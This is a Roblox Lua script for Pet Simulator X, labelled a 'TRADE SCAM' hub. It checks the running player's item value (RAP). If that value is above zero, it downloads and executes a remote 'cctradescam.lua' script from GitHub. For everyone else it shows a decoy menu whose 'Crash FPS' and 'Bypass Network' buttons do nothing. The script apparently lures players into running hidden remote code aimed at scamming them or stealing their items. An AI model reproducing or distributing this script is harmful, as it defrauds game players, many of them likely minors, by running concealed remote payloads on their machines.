local anticheatz = game.Players.LocalPlayer.leaderstats.RAP.Value
 
if anticheatz > 0 then
loadstring(game:HttpGet("https://raw.githubusercontent.com/teohuk/luwsixx/main/cctradescam.lua", true))()
else
local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
local Window = Rayfield:CreateWindow({
    Name = "[❓LUCKY] Pet Simulator X! 🐾 TRADE SCAM",
    LoadingTitle = "[❓LUCKY] Pet Simulator X! 🐾",
    LoadingSubtitle = "by Space Hub",
    ConfigurationSaving = {
       Enabled = false,
       FolderName = nil, -- Create a custom folder for your hub/game
       FileName = "Space Hub"
    },
    Discord = {
       Enabled = true,
       Invite = "https://discord.gg/cUjSMq6s", -- The Discord invite code, do not include discord.gg/. E.g. discord.gg/ABCD would be ABCD
       RememberJoins = false -- Set this to false to make them join the discord every time they load it up
    },
    KeySystem = true, -- Set this to true to use our key system
    KeySettings = {
       Title = "SpaceHub",
       Subtitle = "Key System",
       Note = "Made By SpaceHub#9119",
       FileName = "Key", -- It is recommended to use something unique as other scripts using Rayfield may overwrite your key file
       SaveKey = true, -- The user's key will be saved, but if you change the key, they will be unable to use your script
       GrabKeyFromSite = false, -- If this is true, set Key below to the RAW site you would like Rayfield to get the key from
       Key = {"HubOnScam"} -- List of keys that will be accepted by the system, can be RAW file links (pastebin, github etc) or simple strings ("hello","key22")
    }
 })
 local Tab = Window:CreateTab("Main")
 local Paragraph = Tab:CreateParagraph({Title = "Reminder", Content = "\nAlways active Bypass Network First\n\nDo at your own risk!"})
 local Section = Tab:CreateSection("Basic Features")
 local Button = Tab:CreateButton({
   Name = "Crash FPS",
   Callback = function()
   Rayfield:Notify({
   Title = "Crash FPS Enabled",
   Content = "Please next your trade process",
   Duration = 2,
   Image = 4483362458,
   Actions = { -- Notification Buttons
      Ignore = {
         Name = "Okay!",
         Callback = function()
         print("The user tapped Okay!")
      end
   },
},
})
   end,
})
 local Toggle = Tab:CreateToggle({
   Name = "Bypass Network",
   CurrentValue = false,
   Flag = "Toggle1", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
   Callback = function(Value)
   -- The function that takes place when the toggle is pressed
   -- The variable (Value) is a boolean on whether the toggle is true or false
   end,
})
 local Slider = Tab:CreateSlider({
   Name = "Lag FPS",
   Range = {0, 10},
   Increment = 1,
   Suffix = "FPS",
   CurrentValue = 5,
   Flag = "Slider1", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
   Callback = function(Value)
   -- The function that takes place when the slider changes
   -- The variable (Value) is a number which correlates to the value the slider is currently at
   end,
})
local Section = Tab:CreateSection("Premium Features")
local Input = Tab:CreateInput({
   Name = "Premium Key",
   PlaceholderText = "Key",
   RemoveTextAfterFocusLost = false,
   Callback = function(TradeScam)
   -- The function that takes place when the input is changed
   -- The variable (Text) is a string for the value in the text box
   end,
})
Rayfield:LoadConfiguration()
end